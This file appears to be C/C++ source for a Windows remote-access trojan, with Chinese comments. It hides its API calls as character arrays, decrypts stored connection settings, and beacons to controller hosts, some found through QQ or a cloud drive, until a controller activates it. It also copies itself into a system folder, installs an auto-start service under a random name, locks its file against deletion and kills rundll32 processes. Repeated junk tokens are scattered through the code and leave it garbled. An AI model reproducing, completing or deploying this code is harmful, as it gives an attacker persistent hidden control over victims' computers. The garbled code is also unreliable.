	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");
	if (pGetLastError()==ERROR_ALREADY_EXISTS)
	{
		pSleep(1000);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
	    pExitProcess(NULL);  // 退出运行程序
	}

//	CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);  //线程复活

    ////////////////////////////////////////////////////////////////////////////////////////////////

//	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));  //上线信息解密

	BOOL	bSuccessful = FALSE;
	BOOL    mconct=FALSE;  //通知已经增加
	LPCTSTR lpConnecte[3]={0};  //上线
	lpConnects[0]=m_OnlineInfo.DNS1;
	lpConnects[1]=m_OnlineInfo.DNS2;	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	lpConnects[2]=m_OnlineInfo.DNS3;
	dwPort[0]=m_OnlineInfo.Port1;
	dwPort[1]=m_OnlineInfo.Port2;	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
 	dwPort[2]=m_OnlineInfo.Port3;

	char Lfrfz09[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz09);

	HANDLE	hEvent = NULL;
	//构造函数 初始化Socket库
	CClientSocket socketClient;	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	OpenEventAT pOpenEventA=(OpenEventAT)GetProcAddress(LoadLibrary(Lfrfz02),"OpenEventA");
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	while (1)
	{
		// 如果不是心跳超时，不用再sleep1分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 200; i++)
			{
				hEvent = pOpenEventA(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};	ZHANG
						ZHANG
						XIAOYUAN
						XYMS
						XYMS
						FUFUFU
						ZFYZS
						WSZFY
						FUFUFU
XYMS
	                CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
					pCloseHandle(hEvent);
					break;
				}
				// 改一下
				pSleep(200);
			}
		}

	DWORD dwTickCount = pGetTickCount();
	if(nConnect==0)
		lpConnecte[0]=lpConnects[0];
	if(nConnect==1)
	{
		qqonline(lpConnects[1]);    //QQ  上线
		lpConnecte[1]=lpszQQ;
	}
	if(nConnect==2)
	{	ZHANG
	ZHANG
	XIAOYUAN
	XYMS
	XYMS
	FUFUFU
	ZFYZS
	WSZFY
	FUFUFU
XYMS
		wangpang(lpConnects[2]);    //网盘上线
		lpConnecte[2]=lpszWP;
	}

	if (!socketClient.Connect(lpConnecte[nConnect], dwPort[nConnect]))
	{
		if(mconct!=TRUE)   //判断是否已经增加
		{
			nConnect++;	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
		    if(nConnect>=3)
			    nConnect=0;
		}
		mconct=FALSE; 
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS//增加位复位
		bBreakError = CONNECT_ERROR;
		continue;
	}

	// 登录
	DWORD dwExitCode = SOCKET_ERROR;
	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	sendLoginInfo(ServiceName, &socketClient, pGetTickCount() - dwTickCount,m_OnlineInfo.szMark);
	CKernelManager	manager(&socketClient,ServiceName, g_dwServiceType, strKillEvent, lpConnecte[nConnect], dwPort[nConnect]);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	socketClient.setManagerCallBack(&manager);
	
	//////////////////////////////////////////////////////////////////////////
	// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
	for (int i = 0; (i < 10 && !manager.IsActived()); i++)
	{	ZHANG
	ZHANG
	XIAOYUAN
	XYMS
	XYMS
	FUFUFU
	ZFYZS
	WSZFY
	FUFUFU
XYMS
		pSleep(1000);
	}
	// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
	if (!manager.IsActived())
	{
		nConnect++;	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		if(nConnect>=3)
			nConnect=0;
		mconct=TRUE;  //通知已经增加
		continue;
	}

	//////////////////////////////////////////////////////////////////////////
	
	DWORD	dwIOCPEvent;
	dwTickCount = pGetTickCount();
	
	do
	{
		hEvent = pOpenEventA(EVENT_ALL_ACCESS, false, strKillEvent);
        char BrmAP30[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
        WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP30);
		dwIOCPEvent = pWaitForSingleObject(socketClient.m_hEvent, 100);
		pSleep(500);

	} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
	
	if (hEvent != NULL)
	{
		socketClient.Disconnect();
		char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
	    CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary(Lfrfz02),BrmAP29);
		pCloseHandle(hEvent);
		break;
	}
	else
		pSleep(7000);//需等待控制端退出...
	}

	return;
}

VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	
	//该数组用来异或
	WORD AddTable[]={
			3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	FuckCracker=FALSE;
	
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
//		szData[i]^=AddTable[iCount];
szData[i] = ~((szData[i]^AddTable[iCount])^i);	ZHANG
ZHANG
XIAOYUAN
XYMS
XYMS
FUFUFU
ZFYZS
WSZFY
FUFUFU
XYMS
		//BUG  忘记iCount++ 导致异或的是数组表 3..
		iCount++;
	}
}

/////////////////////////////////////////////////////////////////////////////////////

//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
/*
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,m_ServiceInfo.ReleiceName);
	
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}
*/

int StormRand(int count)
{
	char LCoHX02[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX02);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	unsigned long Time=pGetTickCount();
	int seed=rand()+3;	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	seed=(seed*Time)%count;
	return seed;
}

//============
//static BOOL fDelete_Me=FALSE;
static void RunService(char *m_ServPath,char *m_ServiceName,char *m_DisplayName,char *m_Description)
{

	char FilePath[MAX_PATH];	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char SystemPath[MAX_PATH];
	char LCoHX03[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),LCoHX03);
	pGetModuleFileNameA(NULL,FilePath,MAX_PATH);   //用于获取程序本身路径
	Gyfunction->my_sprintf(SystemPath,"%s",m_ServPath);

	char sIQkS07[] = {'C','o','p','y','F','i','l','e','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
CopyFileAT pCopyFileA=(CopyFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS07);	ZHANG
ZHANG
XIAOYUAN
XYMS
XYMS
FUFUFU
ZFYZS
WSZFY
FUFUFU
XYMS
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (Gyfunction->my_strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{
		MyCreatDirector(SystemPath);   //创建文件夹
		pCopyFileA(FilePath,SystemPath,FALSE);  //复制文件
		if(m_ServiceInfo.Dele_zd)  //安装增大
		{	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
            Wj_OnButtonAdd(SystemPath);  //文件增大
		}
		memset(FilePath,0,MAX_PATH);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		strcpy(FilePath,SystemPath);
//		fDelete_Me = TRUE;
	}

	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
    char FBwWp25[] = {'S','l','e','e','p','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);
	pSleep(5000);
//	char MyPath[MAX_PATH];

//	char run[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'};
//	WriteRegEx(HKEY_LOCAL_MACHINE,run,ServiceName, REG_SZ,SystemPath,strlen(SystemPath), 0);
	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;

	__try
	{
		char HrFvD17[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
		OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD17);
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		char JwFNw18[] = {'C','r','e','a','t','e','S','e','r','v','i','c','e','A','\0'};
		CreateServiceAT pCreateServiceA=(CreateServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw18);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		scm = pOpenSCManagerA(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = pCreateServiceA(
			scm, m_ServiceName, m_DisplayName,
		SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,
		FilePath,NULL, NULL, NULL, NULL, NULL);
		//锁定一下服务...
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		char JwFNw13[] = {'L','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
		LockServiceDatabaseT pLockServiceDatabase=(LockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw13);
		SC_LOCK sc_lock=pLockServiceDatabase(scm);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		SERVICE_DESCRIPTION Service_Descrip={&ServicePlay[0]};

		char VnUDS08[] = {'C','h','a','n','g','e','S','e','r','v','i','c','e','C','o','n','f','i','g','2','A','\0'};
		ChangeServiceConfig2AT pChangeServiceConfig2A=(ChangeServiceConfig2AT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS08);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		pChangeServiceConfig2A(newService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);

		char VnUDS06[] = {'U','n','l','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
		UnlockServiceDatabaseT pUnlockServiceDatabase=(UnlockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS06);
		pUnlockServiceDatabase(sc_lock);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	    GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);
		ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		char HrFvD09[] = {'S','t','a','r','t','S','e','r','v','i','c','e','A','\0'};
		StartServiceAT pStartServiceA=(StartServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD09);

		char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
		if (newService == NULL)
		{
			if (pGetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = pOpenServiceA(scm,m_ServiceName,SERVICE_ALL_ACCESS);	ZHANG
					ZHANG
					XIAOYUAN
					XYMS
					XYMS
					FUFUFU
					ZFYZS
					WSZFY
					FUFUFU
XYMS
				if (newService==NULL)
					__leave;
				else
					pStartServiceA(newService,0, 0);
			}
		}
		if (!pStartServiceA(newService,0, 0))
			__leave;	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcat(Desc,m_ServiceName);

		char JwFNw16[] = {'R','e','g','O','p','e','n','K','e','y','A','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		RegOpenKeyAT pRegOpenKeyA=(RegOpenKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw16);
		pRegOpenKeyA(HKEY_LOCAL_MACHINE,Desc,&key);
		char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
	    lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
		char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
		pRegSetValueExA(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,plstrlenA(m_Description));
	}

	__finally
	{
		char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
		RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		
		char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
        CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		if (newService!=NULL)
			pCloseServiceHandle(newService);
		if (scm!=NULL)
			pCloseServiceHandle(scm);	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
		if (key!=NULL) 
			pRegCloseKey(key);
	}
}

void ServiceMain_2(void)
{
	if(m_ServiceInfo.Dele_fs)  //独占模式运行
	{	ZHANG
	ZHANG
	XIAOYUAN
	XYMS
	XYMS
	FUFUFU
	ZFYZS
	WSZFY
	FUFUFU
XYMS
		OccupyFile(AZname);     //独占模式运行(占坑模式)  无法删除
	}
	my_ServiceMain();
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{	ZHANG
ZHANG
XIAOYUAN
XYMS
XYMS
FUFUFU
ZFYZS
WSZFY
FUFUFU
XYMS
	ServiceMain_2();
}



void my_stormRands(CHAR Number,CHAR Data[])  //获取随机名称
{
    char FBwWp25[] = {'S','l','e','e','p','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	for (int i=0;i<Number;i++)
	{
	    pSleep(StormRand(20));
		if(i==6||i==15)
		{
			Data[i]=' ';
			i++;
			Data[i]='a'+StormRand(26);
			continue;
		}
		Data[i]='a'+StormRand(26);
	}
	Data[0]=Data[0]-32;
}

void ReleiceName(LPCTSTR lpServiceName, LPCTSTR lpGroupName)  //修改安装服务名称
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey,JYvni08,lpServiceName);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ReleiceName", REG_SZ, (char *)lpGroupName, plstrlenA(lpGroupName), 0);
}

void KProcess()   //K终结者进程
{
	char CYZuy01[] = {'W','i','n','E','x','e','c','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	WinExecT pWinExec=(WinExecT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CYZuy01);
	char CYZuy02[] = {'r','u','n','d','l','l','3','2','.','e','x','e','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	if( GetProcessID(CYZuy02) != NULL)
	{	 

		pWinExec("taskkill /f /im rundll32.exe",SW_HIDE);  //关闭进程
	}
}

//////////////////////////////////////////////////////////////////////////
int APIENTRY WinMain( __in HINSTANCE hInstance, 
					  __in_opt HINSTANCE hPrevInstance, 
					  __in_opt LPSTR lpCmdLine, 
					  __in int nShowCmd )
{
	 

//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失


	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC22[] = {'G','e','t','I','n','p','u','t','S','t','a','t','e','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	GetInputStateT pGetInputState=(GetInputStateT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC22);
	pGetInputState();
	char Lfrfz07[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0'};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz07);

	char SSzlC23[] = {'P','o','s','t','T','h','r','e','a','d','M','e','s','s','a','g','e','A','\0'};
	PostThreadMessageAT pPostThreadMessageA=(PostThreadMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC23);
	 

	pPostThreadMessageA(pGetCurrentThreadId(),NULL,0,0);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	MSG	msg;

	char SSzlC24[] = {'G','e','t','M','e','s','s','a','g','e','A','\0'};
	GetMessageAT pGetMessageA=(GetMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC24);
	pGetMessageA(&msg, NULL, NULL, NULL);

/////////////////////////////////////////////////////////////////////////////////////////////////
	char lpBuffer[1024]={NULL};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
    char strSubKey0[1024]={NULL};

	MyEncryptFunction((LPSTR)&m_ServiceInfo,sizeof(SERVERINFO));  //安装信息解密
	 
	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));   //上线信息解密

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp01);

	CHAR Path[MAX_PATH]={NULL};	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char CPolQ15[] = {'E','x','p','a','n','d','E','n','v','i','r','o','n','m','e','n','t','S','t','r','i','n','g','s','A','\0'};
	ExpandEnvironmentStringsAT pExpandEnvironmentStringsA=(ExpandEnvironmentStringsAT)GetProcAddress(LoadLibrary(Lfrfz02),CPolQ15);
	pExpandEnvironmentStringsA(m_ServiceInfo.ReleasePath,Path,MAX_PATH);  // %SystemRoot%\扩充成完整路径 C:WINDOWS\ 
	strcpy(m_ServiceInfo.ReleasePath,Path);
	 

	if(m_ServiceInfo.ReleasePath[strlen(m_ServiceInfo.ReleasePath)-1]=='\\') //去掉最后的'\\'
        m_ServiceInfo.ReleasePath[strlen(m_ServiceInfo.ReleasePath)-1]=0;
	 

	char DQeBW01[] = {'%','s','\\','%','s','\0'};
	Gyfunction->my_sprintf(AZname,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   //连接安装目录和程序名称
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");	ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);
	 

	if(m_ServiceInfo.Dele_Kzj)  //检查是否K终结者
	    KProcess(); //K终结者进程

	//读取安装服务名称
	char Sermess[MAX_PATH]={NULL};  //
	pwsprintfA(Sermess, JYvni08,m_ServiceInfo.ReleacsName);		ZHANG
		ZHANG
		XIAOYUAN
		XYMS
		XYMS
		FUFUFU
		ZFYZS
		WSZFY
		FUFUFU
XYMS
	ReadRegEx(HKEY_LOCAL_MACHINE,Sermess,"ReleiceName", REG_SZ, (char *)ServiceName, NULL, sizeof(ServiceName), 0);
	if(m_ServiceInfo.Dele_zc)  //复活安装
	{
        char szbuf_b[MAX_PATH]={NULL};  //本身路径
		char Lfrfz05[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};	ZHANG
			ZHANG
			XIAOYUAN
			XYMS
			XYMS
			FUFUFU
			ZFYZS
			WSZFY
			FUFUFU
XYMS
	    GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz05);
		pGetModuleFileNameA(NULL,szbuf_b,MAX_PATH);   //用于获取程序本身路径 

        if (strcmp(szbuf_b,AZname)==0)  //判断自路径 是安装途径
		{		 

		    SERVICE_TABLE_ENTRY serviceTable[] = 
			{
				{ServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
				{NULL,NULL}
			};
			char LCoHX01[] = {'S','t','a','r','t','S','e','r','v','i','c','e','C','t','r','l','D','i','s','p','a','t','c','h','e','r','A','\0'};
			StartServiceCtrlDispatcherAT pStartServiceCtrlDispatcherA=(StartServiceCtrlDispatcherAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),LCoHX01);
			ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			Installope=1;  //写入运行方式  服务启动运行
			pSleep(500);
			pStartServiceCtrlDispatcherA(serviceTable);   //服务运行文件
			pSleep(1000);	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS
			pStartServiceCtrlDispatcherA(serviceTable);   //服务运行文件
			Installope=2;  //写入运行方式  服务无法启动改为直接运行
			ServiceMain_2();  //直接运行文件
		}
	    else
		{
			memset(ServiceName, 0, sizeof(ServiceName));
			my_stormRands(13,ServiceName); 	ZHANG
				ZHANG
				XIAOYUAN
				XYMS
				XYMS
				FUFUFU
				ZFYZS
				WSZFY
				FUFUFU
XYMS //随机服务名称
		    my_stormRands(15,ServicePlay);  //随机服务显示
